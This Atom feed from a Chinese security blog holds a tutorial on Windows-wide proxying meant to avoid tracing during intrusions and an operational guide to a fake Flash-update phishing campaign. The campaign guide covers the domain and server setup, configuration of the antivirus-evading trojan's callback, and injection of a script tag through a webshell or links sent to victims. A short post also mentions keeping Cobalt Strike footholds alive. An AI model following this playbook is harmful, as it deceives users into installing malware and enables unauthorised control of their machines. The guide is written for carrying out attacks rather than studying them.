<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://chroblert.github.io</id>
    <title>Z0安全研究</title>
    <updated>2022-02-19T13:42:29.392Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://chroblert.github.io"/>
    <link rel="self" href="https://chroblert.github.io/atom.xml"/>
    <subtitle>知其然知其所以然</subtitle>
    <logo>https://chroblert.github.io/images/avatar.png</logo>
    <icon>https://chroblert.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, Z0安全研究</rights>
    <entry>
        <title type="html"><![CDATA[Windows全局代理]]></title>
        <id>https://chroblert.github.io/post/windows-quan-ju-dai-li/</id>
        <link href="https://chroblert.github.io/post/windows-quan-ju-dai-li/">
        </link>
        <updated>2022-02-19T13:06:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-介绍">0x01 介绍</h1>
<h2 id="1-为什么要全局代理">1. 为什么要全局代理</h2>
<p>在渗透的时候要保护好自己啊，不要被溯源到。<br>
在买的一些VPS上做扫描的时候，有可能会触发到VPS厂商(搬瓦工、Vultr的都有遇到过)的安全机制(如DDoS)，将我们的VPS停机。做好全局代理的情况下，我们就可以在自己的电脑上做些扫描操作了。</p>
<h2 id="2-为什么不用proxifier">2. 为什么不用proxifier</h2>
<p>一直有在用proxifier，这里做个测试，除了局域网的IP，其余全部通过clash，规则如下：<br>
<img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219200629.png" alt="" loading="lazy"></p>
<p>测试ping谷歌和IP情况如下（可以看到并没有起作用）：<br>
<img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219200850.png" alt="" loading="lazy"><br>
<img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219200916.png" alt="" loading="lazy"><br>
##　3. 全局代理的基础<br>
　如果想深入了解的话，需要一些路由和tap/tun虚拟网卡的知识。<br>
　推荐几篇文章，可以看一下：<br>
<a href="https://www.junmajinlong.com/virtual/network/data_flow_about_openvpn/">通过openvpn分析tun实现隧道的数据流程</a><br>
<a href="https://www.junmajinlong.com/virtual/network/all_about_tun_tap/">理解Linux虚拟网卡设备tun/tap的一切</a><br>
<a href="https://www.junmajinlong.com/virtual/network/kernel_nic_ip/">理解物理网卡、网卡接口、内核、IP等属性的关系</a></p>
<h1 id="0x02-实操">0x02 实操</h1>
<h2 id="一windows10全局代理">（一）Windows10全局代理</h2>
<p>Windows10实现全局代理很简单，需要借助一款工具CFW(Clash For Windows)，下面借助最新款的CFW来进行演示（TAP模式）。<br>
<img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219203630.png" alt="" loading="lazy"></p>
<h3 id="1-安装tap">1. 安装TAP</h3>
<p><img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219203651.png" alt="" loading="lazy"><br>
选择“TAP Device”Manage下的Install进行安装，安装完成后，适配器中会出现一个名为cfw-tap的虚拟网卡。<br>
<img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219203706.png" alt="" loading="lazy"></p>
<h3 id="2-启用service模式">2. 启用Service模式</h3>
<p><img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219203729.png" alt="" loading="lazy"><br>
a. 未启用Service模式下的情况下：Service Mode旁边的地球是灰色的。<br>
b. 选择“Service Mode”Manage下的Install进行安装，安装完成后地球变成绿色。<br>
<img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219203746.png" alt="" loading="lazy"></p>
<h3 id="3-开启mixin">3. 开启Mixin</h3>
<p>a. 编辑Mixin配置文件，内容如下：</p>
<pre><code>mixin:
   dns:
     enable: true
     enhanced-mode: redir-host
     nameserver:
       - 223.5.5.5 # 真实请求DNS，可多设置几个
       - 8.8.8.8 # 真实请求DNS，可多设置几个
       - 114.114.114.114
   # interface-name: WLAN # 出口网卡名称，或者使用下方的自动检测
   tun:
     enable: true
     stack: gvisor # 使用 system 需要 Clash Premium 2021.05.08 及更高版本
     dns-hijack:
       - 198.18.0.2:53 # 请勿更改
     auto-route: true
     auto-detect-interface: true # 自动检测出口网卡
</code></pre>
<p>b. 启动Mixin<br>
<img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219203808.png" alt="" loading="lazy"></p>
<h3 id="4-测试">4. 测试</h3>
<p><img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219203819.png" alt="" loading="lazy"><br>
<img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219203828.png" alt="" loading="lazy"></p>
<h2 id="二windows7全局代理">（二）Windows7全局代理</h2>
<p>我在这里直接使用cfw进行了测试，发现启用service模式的时候，并没有实际起作用，Service Mode旁边地球也一直处于灰色的状态。 下面使用另一款工具tun2socks进行全局代理。<br>
tun2socks有几款工具，我这里选择使用go写的一款go-tun2socks,项目地址：https://github.com/eycorsican/go-tun2socks</p>
<h3 id="1-安装tap-2">1. 安装TAP</h3>
<p>a. 下载地址：http://build.openvpn.net/downloads/releases/tap-windows-9.22.1-I602.exe<br>
b. 安装完成后，会出现一个TAP-Windows Adapter V9的虚拟网卡<br>
<img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219203853.png" alt="" loading="lazy"></p>
<h3 id="2-运行tun2socks">2. 运行tun2socks</h3>
<p>a. 按照教程装完tap，再下载tun2socks后直接运行会发现，报如下错误：<br>
<img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219203904.png" alt="" loading="lazy"><br>
b. 经过调试分析后，是添加的虚拟网卡名称的问题。<br>
c. 经过跟踪调试源码，发现会将虚拟网卡名称与ifaceName进行比较，而ifaceName的默认值为tun1.<br>
<img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219203938.png" alt="" loading="lazy"><br>
d. 所以需要将添加的TAP虚拟网卡名称修改为tun1，修改完成后再次运行，结果如下(或者-tunName &quot;虚拟网卡名称&quot;)：</p>
<ul>
<li><img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219204009.png" alt="" loading="lazy"></li>
</ul>
<p>e. 完整参数运行</p>
<ul>
<li>需要提前准备好一个socks代理服务器（这里以本地用clash为例）</li>
<li>tun2socks-windows-4.0-amd64.exe -tunAddr 10.0.0.2 -tunGw 10.0.0.1 -tunDns 114.114.114.114 -prooxyType socks -proxyServer 127.0.0.1:7890 -tunName &quot;本地连接 2&quot;</li>
<li>127.0.0.0:7890是clash在本地监听的一个socks5代理</li>
</ul>
<h3 id="3-路由配置">3. 路由配置</h3>
<p>a. 原始路由<br>
<img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219204039.png" alt="" loading="lazy">		<br>
b. 修改虚拟网卡的跳跃点数为1<br>
<img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219204107.png" alt="" loading="lazy"><br>
c. 之后运行tun2socks的时候，会自动添加一条路由</p>
<ul>
<li>因为此时虚拟网卡的metric的2相比于原始的默认路由11小，所以可以不用删除原始的默认路由。</li>
<li><img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219204137.png" alt="" loading="lazy"></li>
</ul>
<p>d. 此时直接访问网站的话会发现访问不到，经过分析应该是clash出去的机场的IP会路由匹配到10.0.0.1，造成一个回环。</p>
<ul>
<li>因而此时需要找到clash出去的机场IP，通过clash的log和tun2sock的运行界面可以看到大量重复的一个IP，这个就有可能是我们机场的IP。</li>
<li><img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219204225.png" alt="" loading="lazy"></li>
<li><img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219204235.png" alt="" loading="lazy"></li>
<li>找到后需要让机场IP通过原始默认网关出去。</li>
<li>route add &lt;机场IP&gt; mask 255.255.255.255 192.168.14.1</li>
<li><img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219204312.png" alt="" loading="lazy"></li>
</ul>
<h3 id="4-测试-2">4. 测试</h3>
<figure data-type="image" tabindex="6"><img src="https://gitee.com/chroblert/pictures/raw/master/img/20220219204319.png" alt="" loading="lazy"></figure>
<p>参考资料：<a href="https://www.junmajinlong.com/virtual/network/data_flow_about_openvpn/">通过openvpn分析tun实现隧道的数据流程</a><br>
参考资料：<a href="https://www.junmajinlong.com/virtual/network/all_about_tun_tap/">理解Linux虚拟网卡设备tun/tap的一切</a><br>
参考资料：<a href="https://www.junmajinlong.com/virtual/network/kernel_nic_ip/">理解物理网卡、网卡接口、内核、IP等属性的关系</a><br>
参考资料：<a href="https://igghelper.com/helper/?p=402">使用Clash Tun网卡模式</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[flash钓鱼升级版]]></title>
        <id>https://chroblert.github.io/post/flash-diao-yu-sheng-ji-ban/</id>
        <link href="https://chroblert.github.io/post/flash-diao-yu-sheng-ji-ban/">
        </link>
        <updated>2021-11-07T07:22:43.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-目标">0x01 目标</h1>
<h2 id="页面展示">页面展示：</h2>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/chroblert/pictures/raw/master/img/20211107163101.png" alt="" loading="lazy"></figure>
<h2 id="flash页面目标">flash页面目标：</h2>
<ol>
<li>flash页面能够判断当前系统是否已被安装flash马</li>
<li>flash页面能够判断当前系统是否是Windows，若不是则跳转到正常或指定页面</li>
<li>flash安装完成后需能跳转到正常或指定页面</li>
</ol>
<h2 id="flash马目标">flash马目标</h2>
<ol>
<li>flash马能够起一个本地服务</li>
<li>flash马能够免杀</li>
<li>flash马能够捆绑或释放正常flash安装文件</li>
</ol>
<h2 id="过程">过程：</h2>
<ol>
<li>
<p>首先判断系统是否为Windows，若不是则显示正常页面或指定页面；</p>
</li>
<li>
<p>若是Windows，则请求本地1341端口，判断当前机器是否已被控制。</p>
<ul>
<li>
<p>若已被控制，则显示正常页面或跳转到指定页面</p>
</li>
<li>
<p>若未被控制，则弹窗显示flash升级页面</p>
</li>
</ul>
</li>
<li>
<p>等待用户点击”立即升级“按钮</p>
</li>
<li>
<p>用户点击后，js开始每10秒判断一次是否成功执行了程序；</p>
<ul>
<li>若已执行，则跳转到正常页面或指定页面</li>
<li>若未执行，则停留在flash弹窗页面</li>
</ul>
</li>
</ol>
<h2 id="应用场景a_type">应用场景（a_type）：</h2>
<ol>
<li>
<p>已有webshell，可以修改源码，</p>
<ul>
<li>在目标网站的页面源码中直接插入js：已安装flash的情况下，不做任何操作；未安装flash，弹出flash页面，定时检测，安装完成后，页面刷新 [0]</li>
</ul>
</li>
<li>
<p>没有webshell，可以修改目标网站的导航菜单：</p>
<ul>
<li>添加自己的flash页面，供受害者点击；</li>
<li>如果设置了特定页面，则当安装完成后，则跳转到指定页面；</li>
<li>若未设置，则跳转到document.referrer(如果其不包含js中设置的域名)[1]</li>
</ul>
</li>
<li>
<p>直接发送给对方</p>
<ul>
<li>对方直接在浏览器中输入flash地址：如果安装完成后，则直接跳转到指定页面；[2]</li>
</ul>
</li>
</ol>
<h1 id="0x02-使用">0x02 使用</h1>
<h2 id="一-条件">(一) 条件：</h2>
<ol>
<li>一台vps</li>
<li>一个域名</li>
<li>谷歌账号</li>
</ol>
<h2 id="二-步骤">(二) 步骤：</h2>
<h3 id="配置网站">配置网站</h3>
<p>这里推荐宝塔，太方便了</p>
<ol>
<li>
<p>安装宝塔</p>
<ul>
<li><img src="https://gitee.com/chroblert/pictures/raw/master/img/20211107160817.png" alt="" loading="lazy"></li>
</ul>
</li>
<li>
<p>创建网站</p>
<ul>
<li><img src="https://gitee.com/chroblert/pictures/raw/master/img/20211107160944.png" alt="" loading="lazy"></li>
<li>在购买域名的地方，添加dns解析到服务器IP</li>
<li>在宝塔网站-&gt;设置-&gt;一键配置ssl</li>
</ul>
</li>
<li>
<p>下载flash页面并上传到宝塔创建的网站目录下面</p>
<ul>
<li>flash项目地址：https://github.com/chroblert/Flash-Pop2</li>
</ul>
</li>
<li>
<p>申请Origin-Trial</p>
<ul>
<li>访问https://developer.chrome.com/origintrials/#/trials/active</li>
<li>选择并注册Private Network Access from       non-secure contexts</li>
<li><img src="https://gitee.com/chroblert/pictures/raw/master/img/20211107161026.png" alt="" loading="lazy"></li>
<li>填写信息并注册</li>
<li><img src="https://gitee.com/chroblert/pictures/raw/master/img/20211107161055.png" alt="" loading="lazy"></li>
<li>注册成功后会返回一些信息</li>
<li><img src="https://gitee.com/chroblert/pictures/raw/master/img/20211107161114.png" alt="" loading="lazy"></li>
<li>一个token值，该值在2021年12月31日前有效，之后就需要重新申请</li>
</ul>
</li>
<li>
<p>宝塔网站配置Origin-Trial响应头</p>
<ul>
<li>
<p>在网站-&gt;设置-&gt;配置文件中添加</p>
</li>
<li>
<p>add_header Origin-Trial &lt;上步中的token值&gt;</p>
</li>
<li>
<p>添加成功后，响应应该如下</p>
</li>
<li>
<figure data-type="image" tabindex="7"><img src="https://gitee.com/chroblert/pictures/raw/master/img/20211107161147.png" alt="" loading="lazy"></figure>
</li>
</ul>
</li>
</ol>
<h3 id="设置flash参数">设置flash参数</h3>
<ol>
<li>
<p>下载flash-pop2项目后，进入js文件夹下修改flash.js文件中的参数</p>
<figure data-type="image" tabindex="8"><img src="https://gitee.com/chroblert/pictures/raw/master/img/20211107161202.png" alt="" loading="lazy"></figure>
</li>
<li>
<p>配置说明</p>
<ul>
<li>ttarget： 宝塔网站设置的域名</li>
<li>target_file: flash马的下载地址</li>
<li>bc_link: 要跳转到的指定页面</li>
<li>pb_word: 如上图</li>
<li>l_url: flash马在本地监听的http服务</li>
<li>l_res: flash马在本地监听的http服务返回的响应</li>
<li>a_type: 应用场景</li>
</ul>
</li>
<li>
<p>flash马</p>
<ul>
<li>flash马中应该起一个http服务，并返回设置的l_res内容</li>
<li>flash马中的http服务应该返回一个用于解决跨域问题的响应头 Access-Control-Allow-Origin: *</li>
<li>示例如下：</li>
<li><img src="https://gitee.com/chroblert/pictures/raw/master/img/20211107161249.png" alt="" loading="lazy"></li>
<li><img src="https://gitee.com/chroblert/pictures/raw/master/img/20211107161309.png" alt="" loading="lazy"></li>
</ul>
</li>
</ol>
<h3 id="应用">应用</h3>
<ol>
<li>
<p>已有webshell，可以修改网站源代码</p>
<ul>
<li>修改网站源码，添加<code>&lt;script src=//flash-pop2-domain.com/js/flash.js&gt;&lt;/script&gt;</code></li>
<li>这里目标网站用什么，这里就填什么。如果目标网站是http，这里却是https，那么chrome会出现cors问题，firefox没这个问题…</li>
</ul>
</li>
<li>
<p>没有webshell，可以修改网站菜单</p>
<ul>
<li>添加或修改菜单链接为https://flash-pop2-domain.com/index.html</li>
</ul>
</li>
<li>
<p>直接发送给客服或者受害者</p>
<ul>
<li>将https://flash-pop2-domain.com/index.html直接发送给对方</li>
</ul>
</li>
</ol>
<p>参考资料：<a href="https://www.jianshu.com/p/4a29309b3ba2">XHR</a></p>
<p>参考资料：<a href="https://harttle.land/2015/10/01/javascript-dom-api.html">原生js dom操作汇总</a></p>
<p>参考资料：<a href="https://zhuanlan.zhihu.com/p/343487727">山寨“特供版”flash</a></p>
<p>参考资料：<a href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/#CDN">检测与隐藏CS服务器</a></p>
<p>参考资料：<a href="https://blog.csdn.net/jsbba/article/details/121011835">CF源IP问题</a></p>
<p>参考资料：<a href="https://kebingzao.com/2021/10/11/chrome-private-cors-error/">http 远程站点请求 ip 地址报 CORS 错误</a></p>
<p>参考资料：<a href="https://kebingzao.com/2020/04/26/cloudfront-add-x-frame-options/">CDN添加自定义响应头</a></p>
<p>参考资料：<a href="https://blog.dsrkafuu.su/post/2020/cloudflare-worker-cors-anywhere/">cf使用worker添加响应头</a></p>
<p>参考资料：<a href="https://stackoverflow.com/questions/25395119/catch-asynchronous-network-error-from-xmlhttprequest-send">一个大坑-请求报错会导致window.onload无法执行</a></p>
<p>参考资料：<a href="https://zh.javascript.info/onload-onerror">资源加载：onload，onerror</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CobaltStrike上线自动维权]]></title>
        <id>https://chroblert.github.io/post/cobaltstrike-shang-xian-zi-dong-wei-quan/</id>
        <link href="https://chroblert.github.io/post/cobaltstrike-shang-xian-zi-dong-wei-quan/">
        </link>
        <updated>2021-10-30T11:53:11.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>flash钓鱼后，高兴的是它上线了，可惜的是上线的时候没看到它又掉了....<br>
<img src="https://chroblert.github.io/post-images/1635601129786.png" alt="" loading="lazy"></p>
</blockquote>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[关于]]></title>
        <id>https://chroblert.github.io/post/about/</id>
        <link href="https://chroblert.github.io/post/about/">
        </link>
        <updated>2021-10-29T14:59:05.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>欢迎</p>
</blockquote>
]]></content>
    </entry>
</feed>